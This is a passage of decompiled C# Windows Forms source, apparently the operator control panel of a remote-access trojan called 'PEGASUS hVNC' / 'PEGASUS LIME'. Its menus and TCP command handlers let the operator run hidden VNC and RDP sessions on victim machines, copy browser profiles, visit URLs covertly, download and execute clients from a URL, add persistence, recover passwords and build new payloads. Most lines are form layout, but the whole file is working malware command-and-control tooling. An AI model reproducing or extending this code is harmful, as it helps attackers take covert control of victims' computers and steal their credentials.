				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8893* ", (TcpClient)tag);
			}
		}

		private void rEMOVEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8894* ", (TcpClient)tag);
			}
		}

		private void guna2ControlBox1_Click(object sender, EventArgs e)
		{
			Hide();
		}

		private void btnClose_Click(object sender, EventArgs e)
		{
			Hide();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGASUS_LIME.Design.PEGASUS));
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
			label1 = new System.Windows.Forms.Label();
			label2 = new System.Windows.Forms.Label();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			label8 = new System.Windows.Forms.Label();
			chkSounds = new Guna.UI2.WinForms.Guna2ToggleSwitch();
			Listener = new System.Windows.Forms.Label();
			label5 = new System.Windows.Forms.Label();
			label6 = new System.Windows.Forms.Label();
			label9 = new System.Windows.Forms.Label();
			guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			visitURL = new System.Windows.Forms.ToolStripMenuItem();
			killChrome = new System.Windows.Forms.ToolStripMenuItem();
			resetScale = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
			fromURL = new System.Windows.Forms.ToolStripMenuItem();
			hVNCCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			StartHvnc = new System.Windows.Forms.ToolStripMenuItem();
			hRDPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			iNSTALLToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			cOPYPROFILEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			rEMOVEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			aDDPERSISTENCEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			aDDPERSISTENCEToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			rEMOVEPERSISTENCEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			Recover = new System.Windows.Forms.ToolStripMenuItem();
			builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			uNINSTALLToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			statusStrip1 = new System.Windows.Forms.StatusStrip();
			ClientsOnline = new System.Windows.Forms.ToolStripStatusLabel();
			StartPort = new Guna.UI2.WinForms.Guna2ToggleSwitch();
			label12 = new System.Windows.Forms.Label();
			label13 = new System.Windows.Forms.Label();
			ListenPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
			imageList1 = new System.Windows.Forms.ImageList(components);
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			imageList2 = new System.Windows.Forms.ImageList(components);
			HVNCList = new System.Windows.Forms.ListView();
			columnHeader3 = new System.Windows.Forms.ColumnHeader();
			columnHeader2 = new System.Windows.Forms.ColumnHeader();
			columnHeader1 = new System.Windows.Forms.ColumnHeader();
			columnHeader4 = new System.Windows.Forms.ColumnHeader();
			columnHeader5 = new System.Windows.Forms.ColumnHeader();
			columnHeader7 = new System.Windows.Forms.ColumnHeader();
			columnHeader6 = new System.Windows.Forms.ColumnHeader();
			columnHeader8 = new System.Windows.Forms.ColumnHeader();
			columnHeader9 = new System.Windows.Forms.ColumnHeader();
			columnHeader10 = new System.Windows.Forms.ColumnHeader();
			HVNCListenBtn = new System.Windows.Forms.ToolStripMenuItem();
			portToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			HVNCListenPort = new System.Windows.Forms.ToolStripTextBox();
			toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
			guna2VScrollBar1 = new Guna.UI2.WinForms.Guna2VScrollBar();
			timer1 = new System.Windows.Forms.Timer(components);
			btnClose = new Guna.UI2.WinForms.Guna2PictureBox();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			guna2ContextMenuStrip1.SuspendLayout();
			statusStrip1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)ListenPort).BeginInit();
			((System.ComponentModel.ISupportInitialize)btnClose).BeginInit();
			SuspendLayout();
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(182, 37, 32);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(182, 37, 32);
			guna2ShadowForm1.TargetForm = this;
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox2.BackgroundImage");
			guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox2.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(1401, 17);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.ShowIcon = false;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox2.TabIndex = 1;
			guna2ControlBox2.UseTransparentBackground = true;
			guna2ControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox3.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox3.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox3.BackgroundImage");
			guna2ControlBox3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox3.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
			guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox3.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox3.HoverState.Parent = guna2ControlBox3;
			guna2ControlBox3.IconColor = System.Drawing.Color.White;
			guna2ControlBox3.Location = new System.Drawing.Point(1356, 17);
			guna2ControlBox3.Name = "guna2ControlBox3";
			guna2ControlBox3.ShadowDecoration.Parent = guna2ControlBox3;
			guna2ControlBox3.ShowIcon = false;
			guna2ControlBox3.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox3.TabIndex = 2;
			guna2ControlBox3.UseTransparentBackground = true;
			label1.Anchor = System.Windows.Forms.AnchorStyles.Top;
			label1.AutoSize = true;
			label1.BackColor = System.Drawing.Color.Transparent;
			label1.Font = new System.Drawing.Font("Electrolize", 14.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.Location = new System.Drawing.Point(709, 23);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(66, 22);
			label1.TabIndex = 3;
			label1.Text = "HVNC";
			label2.Anchor = System.Windows.Forms.AnchorStyles.Top;
			label2.AutoSize = true;
			label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label2.ForeColor = System.Drawing.Color.White;
			label2.Location = new System.Drawing.Point(700, 22);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(84, 20);
			label2.TabIndex = 4;
			label2.Text = "[             ]";
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(9, -3);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(92, 72);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 5;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			label8.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label8.AutoSize = true;
			label8.BackColor = System.Drawing.Color.Transparent;
			label8.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label8.Location = new System.Drawing.Point(826, 654);
			label8.Name = "label8";
			label8.Size = new System.Drawing.Size(115, 15);
			label8.TabIndex = 23;
			label8.Text = "Connection Sound :";
			label8.Visible = false;
			chkSounds.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			chkSounds.BackColor = System.Drawing.Color.Transparent;
			chkSounds.CheckedState.BorderColor = System.Drawing.Color.DimGray;
			chkSounds.CheckedState.BorderRadius = 2;
			chkSounds.CheckedState.BorderThickness = 1;
			chkSounds.CheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			chkSounds.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			chkSounds.CheckedState.InnerBorderRadius = 2;
			chkSounds.CheckedState.InnerColor = System.Drawing.Color.FromArgb(182, 37, 32);
			chkSounds.CheckedState.Parent = chkSounds;
			chkSounds.Location = new System.Drawing.Point(946, 651);
			chkSounds.Name = "chkSounds";
			chkSounds.ShadowDecoration.Parent = chkSounds;
			chkSounds.Size = new System.Drawing.Size(55, 20);
			chkSounds.TabIndex = 21;
			chkSounds.UncheckedState.BorderColor = System.Drawing.Color.DimGray;
			chkSounds.UncheckedState.BorderRadius = 2;
			chkSounds.UncheckedState.BorderThickness = 1;
			chkSounds.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			chkSounds.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			chkSounds.UncheckedState.InnerBorderRadius = 2;
			chkSounds.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(182, 37, 32);
			chkSounds.UncheckedState.Parent = chkSounds;
			chkSounds.Visible = false;
			Listener.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			Listener.AutoSize = true;
			Listener.BackColor = System.Drawing.Color.Transparent;
			Listener.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			Listener.ForeColor = System.Drawing.Color.White;
			Listener.Location = new System.Drawing.Point(1373, 651);
			Listener.Name = "Listener";
			Listener.Size = new System.Drawing.Size(82, 15);
			Listener.TabIndex = 20;
			Listener.Text = "Not Listening";
			label5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label5.AutoSize = true;
			label5.BackColor = System.Drawing.Color.Transparent;
			label5.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label5.Location = new System.Drawing.Point(1274, 651);
			label5.Name = "label5";
			label5.Size = new System.Drawing.Size(96, 15);
			label5.TabIndex = 19;
			label5.Text = "Listener Status:";
			label6.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label6.AutoSize = true;
			label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label6.ForeColor = System.Drawing.Color.White;
			label6.Location = new System.Drawing.Point(813, 649);
			label6.Name = "label6";
			label6.Size = new System.Drawing.Size(204, 20);
			label6.TabIndex = 25;
			label6.Text = "[                                     ]";
			label6.Visible = false;
			label9.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label9.AutoSize = true;
			label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label9.ForeColor = System.Drawing.Color.White;
			label9.Location = new System.Drawing.Point(1259, 648);
			label9.Name = "label9";
			label9.Size = new System.Drawing.Size(234, 20);
			label9.TabIndex = 27;
			label9.Text = "[                                           ]";
			guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip1.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(32, 32);
			guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { toolStripMenuItem2, hVNCCToolStripMenuItem, StartHvnc, hRDPToolStripMenuItem, aDDPERSISTENCEToolStripMenuItem, Recover, builderToolStripMenuItem, uNINSTALLToolStripMenuItem1 });
			guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(182, 37, 32);
			guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(182, 37, 32);
			guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.Silver;
			guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip1.Size = new System.Drawing.Size(249, 202);
			toolStripMenuItem2.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			toolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { visitURL, resetScale, toolStripMenuItem6 });
			toolStripMenuItem2.ForeColor = System.Drawing.Color.White;
			toolStripMenuItem2.Name = "toolStripMenuItem2";
			toolStripMenuItem2.Size = new System.Drawing.Size(248, 22);
			toolStripMenuItem2.Text = "    [REMOTE EXECUTE]";
			visitURL.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			visitURL.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			visitURL.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[1] { killChrome });
			visitURL.ForeColor = System.Drawing.Color.White;
			visitURL.Name = "visitURL";
			visitURL.Size = new System.Drawing.Size(239, 22);
			visitURL.Text = "VISIT URL HIDDEN";
			visitURL.Click += new System.EventHandler(visitURL_Click);
			killChrome.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			killChrome.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			killChrome.ForeColor = System.Drawing.Color.White;
			killChrome.Name = "killChrome";
			killChrome.Size = new System.Drawing.Size(163, 22);
			killChrome.Text = "KILL CHROME";
			killChrome.Click += new System.EventHandler(killChrome_Click);
			resetScale.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			resetScale.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			resetScale.ForeColor = System.Drawing.Color.White;
			resetScale.Name = "resetScale";
			resetScale.Size = new System.Drawing.Size(239, 22);
			resetScale.Text = "RESET SCALE";
			resetScale.Click += new System.EventHandler(resetScale_Click);
			toolStripMenuItem6.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem6.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			toolStripMenuItem6.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[1] { fromURL });
			toolStripMenuItem6.ForeColor = System.Drawing.Color.White;
			toolStripMenuItem6.Name = "toolStripMenuItem6";
			toolStripMenuItem6.Size = new System.Drawing.Size(239, 22);
			toolStripMenuItem6.Text = "UPDATE/EXECUTE CLIENT";
			fromURL.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			fromURL.ForeColor = System.Drawing.Color.White;
			fromURL.Name = "fromURL";
			fromURL.Size = new System.Drawing.Size(143, 22);
			fromURL.Text = "FROM URL";
			fromURL.Click += new System.EventHandler(fromURL_Click);
			hVNCCToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			hVNCCToolStripMenuItem.Name = "hVNCCToolStripMenuItem";
			hVNCCToolStripMenuItem.Size = new System.Drawing.Size(248, 22);
			hVNCCToolStripMenuItem.Text = "    [HVNC C++ STUB]";
			hVNCCToolStripMenuItem.Visible = false;
			hVNCCToolStripMenuItem.Click += new System.EventHandler(hVNCCToolStripMenuItem_Click);
			StartHvnc.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			StartHvnc.ForeColor = System.Drawing.Color.White;
			StartHvnc.Name = "StartHvnc";
			StartHvnc.Size = new System.Drawing.Size(248, 22);
			StartHvnc.Text = "    [HVNC C#]";
			StartHvnc.Click += new System.EventHandler(StartHvnc_Click);
			hRDPToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { iNSTALLToolStripMenuItem, cOPYPROFILEToolStripMenuItem, rEMOVEToolStripMenuItem });
			hRDPToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			hRDPToolStripMenuItem.Name = "hRDPToolStripMenuItem";
			hRDPToolStripMenuItem.Size = new System.Drawing.Size(248, 22);
			hRDPToolStripMenuItem.Text = "    [HRDP]";
			hRDPToolStripMenuItem.Visible = false;
			iNSTALLToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			iNSTALLToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			iNSTALLToolStripMenuItem.Name = "iNSTALLToolStripMenuItem";
			iNSTALLToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
			iNSTALLToolStripMenuItem.Text = "INSTALL";
			iNSTALLToolStripMenuItem.Click += new System.EventHandler(iNSTALLToolStripMenuItem_Click);
			cOPYPROFILEToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			cOPYPROFILEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			cOPYPROFILEToolStripMenuItem.Name = "cOPYPROFILEToolStripMenuItem";
			cOPYPROFILEToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
			cOPYPROFILEToolStripMenuItem.Text = "COPY PROFILE";
			cOPYPROFILEToolStripMenuItem.Click += new System.EventHandler(cOPYPROFILEToolStripMenuItem_Click);
			rEMOVEToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			rEMOVEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			rEMOVEToolStripMenuItem.Name = "rEMOVEToolStripMenuItem";
			rEMOVEToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
			rEMOVEToolStripMenuItem.Text = "REMOVE";
			rEMOVEToolStripMenuItem.Click += new System.EventHandler(rEMOVEToolStripMenuItem_Click);
			aDDPERSISTENCEToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { aDDPERSISTENCEToolStripMenuItem1, rEMOVEPERSISTENCEToolStripMenuItem });
			aDDPERSISTENCEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			aDDPERSISTENCEToolStripMenuItem.Name = "aDDPERSISTENCEToolStripMenuItem";
			aDDPERSISTENCEToolStripMenuItem.Size = new System.Drawing.Size(248, 22);
			aDDPERSISTENCEToolStripMenuItem.Text = "    [ADD PERSISTENCE]";
			aDDPERSISTENCEToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			aDDPERSISTENCEToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			aDDPERSISTENCEToolStripMenuItem1.Name = "aDDPERSISTENCEToolStripMenuItem1";
			aDDPERSISTENCEToolStripMenuItem1.Size = new System.Drawing.Size(232, 22);
			aDDPERSISTENCEToolStripMenuItem1.Text = "    ADD PERSISTENCE";
			aDDPERSISTENCEToolStripMenuItem1.Click += new System.EventHandler(aDDPERSISTENCEToolStripMenuItem_Click);
			rEMOVEPERSISTENCEToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			rEMOVEPERSISTENCEToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			rEMOVEPERSISTENCEToolStripMenuItem.Name = "rEMOVEPERSISTENCEToolStripMenuItem";
			rEMOVEPERSISTENCEToolStripMenuItem.Size = new System.Drawing.Size(232, 22);
			rEMOVEPERSISTENCEToolStripMenuItem.Text = "    REMOVE PERSISTENCE";
			rEMOVEPERSISTENCEToolStripMenuItem.Click += new System.EventHandler(rEMOVEPERSISTENCEToolStripMenuItem_Click);
			Recover.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			Recover.ForeColor = System.Drawing.Color.White;
			Recover.Name = "Recover";
			Recover.Size = new System.Drawing.Size(248, 22);
			Recover.Text = "    [PASSWORDS RECOVERY]";
			Recover.Visible = false;
			Recover.Click += new System.EventHandler(Recover_Click);
			builderToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			builderToolStripMenuItem.Name = "builderToolStripMenuItem";
			builderToolStripMenuItem.Size = new System.Drawing.Size(248, 22);
			builderToolStripMenuItem.Text = "    [PEGASUS LIME BUILDER]";
			builderToolStripMenuItem.Visible = false;
			builderToolStripMenuItem.Click += new System.EventHandler(builderToolStripMenuItem_Click);
			uNINSTALLToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
			uNINSTALLToolStripMenuItem1.Name = "uNINSTALLToolStripMenuItem1";
			uNINSTALLToolStripMenuItem1.Size = new System.Drawing.Size(248, 22);
			uNINSTALLToolStripMenuItem1.Text = "    [UNINSTALL]";
			uNINSTALLToolStripMenuItem1.Click += new System.EventHandler(uNINSTALLToolStripMenuItem_Click);
			statusStrip1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			statusStrip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
			statusStrip1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { ClientsOnline });
			statusStrip1.Location = new System.Drawing.Point(2, 372);
			statusStrip1.Name = "statusStrip1";
			statusStrip1.Size = new System.Drawing.Size(72, 22);
			statusStrip1.SizingGrip = false;
			statusStrip1.TabIndex = 33;
			statusStrip1.Text = "statusStrip1";
			ClientsOnline.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			ClientsOnline.ForeColor = System.Drawing.Color.Gainsboro;
			ClientsOnline.Name = "ClientsOnline";
			ClientsOnline.Size = new System.Drawing.Size(55, 17);
			ClientsOnline.Text = "Online 0";
			StartPort.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			StartPort.BackColor = System.Drawing.Color.Transparent;
			StartPort.CheckedState.BorderColor = System.Drawing.Color.DimGray;
			StartPort.CheckedState.BorderRadius = 2;
			StartPort.CheckedState.BorderThickness = 1;
			StartPort.CheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			StartPort.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			StartPort.CheckedState.InnerBorderRadius = 2;
			StartPort.CheckedState.InnerColor = System.Drawing.Color.FromArgb(182, 37, 32);
			StartPort.CheckedState.Parent = StartPort;
			StartPort.Location = new System.Drawing.Point(1188, 648);
			StartPort.Name = "StartPort";
			StartPort.ShadowDecoration.Parent = StartPort;
			StartPort.Size = new System.Drawing.Size(55, 20);
			StartPort.TabIndex = 34;
			StartPort.UncheckedState.BorderColor = System.Drawing.Color.DimGray;
			StartPort.UncheckedState.BorderRadius = 2;
			StartPort.UncheckedState.BorderThickness = 1;
			StartPort.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			StartPort.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			StartPort.UncheckedState.InnerBorderRadius = 2;
			StartPort.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(182, 37, 32);
			StartPort.UncheckedState.Parent = StartPort;
			StartPort.CheckedChanged += new System.EventHandler(StartPort_CheckedChanged);
			label12.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label12.AutoSize = true;
			label12.BackColor = System.Drawing.Color.Transparent;
			label12.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label12.Location = new System.Drawing.Point(1124, 651);
			label12.Name = "label12";
			label12.Size = new System.Drawing.Size(58, 15);
			label12.TabIndex = 35;
			label12.Text = "Listener :";
			label13.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label13.AutoSize = true;
			label13.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label13.ForeColor = System.Drawing.Color.White;
			label13.Location = new System.Drawing.Point(1017, 648);
			label13.Name = "label13";
			label13.Size = new System.Drawing.Size(244, 20);
			label13.TabIndex = 36;
			label13.Text = "[                                             ]";
			ListenPort.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			ListenPort.BackColor = System.Drawing.Color.Transparent;
			ListenPort.BorderColor = System.Drawing.Color.White;
			ListenPort.BorderThickness = 0;
			ListenPort.Cursor = System.Windows.Forms.Cursors.IBeam;
			ListenPort.DisabledState.BorderColor = System.Drawing.Color.Transparent;
			ListenPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			ListenPort.DisabledState.ForeColor = System.Drawing.Color.White;
			ListenPort.DisabledState.Parent = ListenPort;
			ListenPort.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			ListenPort.FocusedState.BorderColor = System.Drawing.Color.Transparent;
			ListenPort.FocusedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			ListenPort.FocusedState.ForeColor = System.Drawing.Color.White;
			ListenPort.FocusedState.Parent = ListenPort;
			ListenPort.Font = new System.Drawing.Font("Electrolize", 9f);
			ListenPort.ForeColor = System.Drawing.Color.LightGray;
			ListenPort.Location = new System.Drawing.Point(1032, 646);
			ListenPort.Maximum = new decimal(new int[4] { 65553, 0, 0, 0 });
			ListenPort.Minimum = new decimal(new int[4] { 1025, 0, 0, 0 });
			ListenPort.Name = "ListenPort";
			ListenPort.ShadowDecoration.Parent = ListenPort;
			ListenPort.Size = new System.Drawing.Size(90, 25);
			ListenPort.TabIndex = 144;
			ListenPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			ListenPort.Value = new decimal(new int[4] { 4448, 0, 0, 0 });
			imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
			imageList1.TransparentColor = System.Drawing.Color.Black;
			imageList1.Images.SetKeyName(0, "ad.png");
			imageList1.Images.SetKeyName(1, "ae.png");
			imageList1.Images.SetKeyName(2, "af.png");
			imageList1.Images.SetKeyName(3, "ag.png");
